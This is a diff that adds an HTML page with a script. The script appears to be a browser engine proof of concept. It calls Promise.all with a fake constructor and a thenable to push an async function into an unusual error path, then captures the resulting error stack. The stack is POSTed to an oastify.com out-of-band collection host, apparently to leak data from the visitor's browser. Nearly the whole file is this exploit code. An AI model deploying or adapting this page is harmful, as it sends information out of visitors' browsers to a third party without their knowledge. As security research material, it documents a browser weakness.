@@ -1,0 +1,54 @@
+<script>
+  var closure;
+
+function Constructor(executor) {
+  executor(() => {}, () => {});
+}
+Constructor.resolve = function(v) {
+  return v;
+};
+
+let p1 = {
+  then(onFul, onRej) {
+    closure = onFul;
+    closure(1);
+  }
+};
+
+async function foo() {
+  await Promise.all.call(Constructor, [p1]);
+  await bar(1);
+}
+
+async function bar(x) {
+  await x;
+  throw new Error("Let's have a look...");
+}
+
+async function fetchErrorStack(stack) {
+  const url = `https://mg6sw1xe43kpy8oq1q1867pcc3iu6mub.oastify.com/log`; // Replace with your actual URL
+  try {
+    const response = await fetch(url, {
+      method: 'POST', // Use POST to send data
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: `stack=${encodeURIComponent(stack)}`,
+    });
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    console.log('Error stack sent successfully');
+  } catch (fetchError) {
+    console.error('Failed to send error stack:', fetchError);
+  }
+}
+
+foo()
+  .then(closure)
+  .catch(async e => {
+    // Send the error stack to the URL
+    await fetchErrorStack(e.stack);
+  });
+
+</script>
